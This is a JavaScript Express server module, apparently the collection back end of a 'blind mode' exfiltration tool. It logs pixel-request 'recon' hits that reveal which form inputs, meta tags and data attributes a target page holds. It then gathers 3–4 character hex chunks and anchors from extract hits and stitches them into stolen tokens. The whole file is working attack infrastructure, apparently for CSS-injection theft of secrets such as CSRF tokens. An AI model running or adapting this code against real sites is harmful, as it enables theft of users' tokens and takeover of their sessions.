'use strict';

// Server side of blind mode (see public/blind.js for the payloads).
//
//   GET  /r/<kind>/<name>     recon hit
//   GET  /api/recon           fields discovered by the last recon burst
//   POST /api/blind           choose fields to extract: { fields: [...] }
//   GET  /b/<id>/...          extract hits, namespaced by field id
//   GET  /api/blind/tokens    per-field results of the last extract burst
//   GET  /api/blind/reset
//
// Bursts work like the targeted mode's: a quiet gap of settleMs ends one, and
// results are only computed after it so a poll can't lock in partial data.

const {
  INPUT_NAMES, META_NAMES, URL_PARAMS, DATA_ATTRS, RECON_KINDS, fieldsFromRecon, assignHosts,
} = require('../public/blind');
const { ANCHOR_LENGTH } = require('../public/payload');
const { stitchUnknownLength } = require('./stitch');

const G = '\x1b[32m';
const Y = '\x1b[33m';
const D = '\x1b[2m';
const B = '\x1b[1m';
const X = '\x1b[0m';

const MAX_FIELDS = 8;

// Which names and hosts each kind of field may use.
const KINDS = {
  input: { names: new Set(INPUT_NAMES), hosts: ['form', 'html'], whole: true },
  meta: { names: new Set(META_NAMES), hosts: ['self'], whole: true },
  data: { names: new Set(DATA_ATTRS), hosts: ['self', 'html'], whole: true },
  a: { names: new Set(URL_PARAMS), hosts: ['self'], whole: false },
  form: { names: new Set(URL_PARAMS), hosts: ['self'], whole: false },
};
const RECON_NAMES = Object.fromEntries(
  Object.entries(RECON_KINDS).map(([kind, names]) => [kind, new Set(names)]),
);

function validField(f) {
  const kind = KINDS[f && f.kind];
  return Boolean(kind && kind.names.has(f.name) && kind.hosts.includes(f.host));
}

function mountBlind(app, { settleMs, pixel, log = console.log }) {
  const recon = { hits: new Set(), lastAt: 0 };
  // Field ids keep counting across configurations so every extract payload
  // uses fresh URLs: a browser won't re-request an image URL it already
  // loaded in the same page, e.g. when trying 3- then 4-char windows.
  let nextId = 0;
  let fields = new Map();
  let extract = emptyExtract();

  function emptyExtract() {
    return { states: new Map(), lastAt: 0, hits: 0, dirty: true, cached: null };
  }

  app.get('/r/:kind/:name', (req, res, next) => {
    const { kind, name } = req.params;
    if (!RECON_NAMES[kind] || !RECON_NAMES[kind].has(name)) return next();
    const now = Date.now();
    if (now - recon.lastAt > settleMs) {
      recon.hits = new Set();
      log(`\n${G}--- new recon ---${X}`);
    }
    const key = `${kind}/${name}`;
    if (!recon.hits.has(key)) log(`${D}recon:${X} ${key}`);
    recon.hits.add(key);
    recon.lastAt = now;
    res.type('gif').send(pixel);
  });

  app.get('/api/recon', (req, res) => {
    if (!recon.hits.size) return res.json({ status: 'waiting' });
    if (Date.now() - recon.lastAt < settleMs) return res.json({ status: 'partial', hits: recon.hits.size });
    const { fields: found, unlistedInputs } = fieldsFromRecon(recon.hits);
    res.json({ status: 'ok', fields: found, unlistedInputs });
  });

  app.post('/api/blind', (req, res) => {
    const wanted = Array.isArray(req.body && req.body.fields) ? req.body.fields : [];
    if (!wanted.length || wanted.length > MAX_FIELDS || !wanted.every(validField)) {
      return res.status(400).json({ error: `choose 1-${MAX_FIELDS} fields found by recon` });
    }
    const assigned = assignHosts(wanted.map((f, i) => ({
      id: nextId + i,
      kind: f.kind,
      name: f.name,
      host: f.host,
      windowSize: Number(f.windowSize) === 3 ? 3 : 4,
    })));
    if (assigned.error) return res.status(400).json({ error: assigned.error });
    nextId += wanted.length;
    fields = new Map(assigned.fields.map(f => [f.id, f]));
    extract = emptyExtract();
    log(`\n${G}${B}blind extract configured${X}`);
    for (const f of assigned.fields) log(`${D}#${f.id} ${f.kind} ${f.name} (host ${f.host}, ${f.windowSize}-char)${X}`);
    res.json({ fields: assigned.fields });
  });

  function record(fid, type, chunk, res, next) {
    const field = fields.get(Number(fid));
    if (!field) return next();
    if (type === 'm' && chunk.length !== field.windowSize) return next();
    const now = Date.now();
    if (now - extract.lastAt > settleMs) {
      extract = emptyExtract();
      log(`\n${G}--- new blind extraction ---${X}`);
    }
    if (!extract.states.has(field.id)) {
      extract.states.set(field.id, { s: new Set(), e: new Set(), r: new Set(), m: new Set() });
    }
    extract.states.get(field.id)[type].add(chunk);
    extract.hits++;
    extract.lastAt = now;
    extract.dirty = true;
    res.type('gif').send(pixel);
  }

  const anchor = `[0-9a-f]{${ANCHOR_LENGTH}}`;
  app.get(`/b/:fid(\\d+)/:t(s|e|r)/:c(${anchor})`, (req, res, next) =>
    record(req.params.fid, req.params.t, req.params.c, res, next));
  app.get('/b/:fid(\\d+)/:c([0-9a-f]{3,4})', (req, res, next) =>
    record(req.params.fid, 'm', req.params.c, res, next));

  app.get('/api/blind/tokens', (req, res) => {
    if (!extract.hits) return res.json({ status: 'waiting' });
    if (Date.now() - extract.lastAt < settleMs) return res.json({ status: 'partial', hits: extract.hits });
    if (!extract.dirty && extract.cached) return res.json(extract.cached);

    const results = [...fields.values()].map(field => {
      const st = extract.states.get(field.id);
      const out = { id: field.id, kind: field.kind, name: field.name };
      if (!st) return { ...out, status: 'none' };
      const result = stitchUnknownLength({
        starts: [...st.s],
        ends: [...st.e],
        runStarts: [...st.r],
        chunks: [...st.m],
      }, { windowSize: field.windowSize, whole: KINDS[field.kind].whole });
      if (!result) {
        log(`${Y}#${field.id} ${field.name}: no hex token recovered${X}`);
        return { ...out, status: 'failed', chunks: st.m.size };
      }
      if (result.candidates) {
        const more = result.truncated ? '+' : '';
        log(`\n${Y}${B}#${field.id} ${field.name}: ambiguous (${result.candidates.length}${more} candidates):${X}`);
        result.candidates.forEach(c => log(`  ${c}`));
      } else {
        log(`\n${G}${B}#${field.id} ${field.name} (${result.length} chars):${X} ${result.token}`);
      }
      return {
        ...out,
        status: 'ok',
        token: result.token,
        length: result.length,
        candidates: result.candidates,
        truncated: result.truncated,
      };
    });
    extract.cached = { status: 'ok', results };
    extract.dirty = false;
    res.json(extract.cached);
  });

  app.get('/api/blind/reset', (req, res) => {
    recon.hits = new Set();
    recon.lastAt = 0;
    extract = emptyExtract();
    log(`${D}blind state reset${X}`);
    res.json({ status: 'ok' });
  });
}

module.exports = { mountBlind, validField };
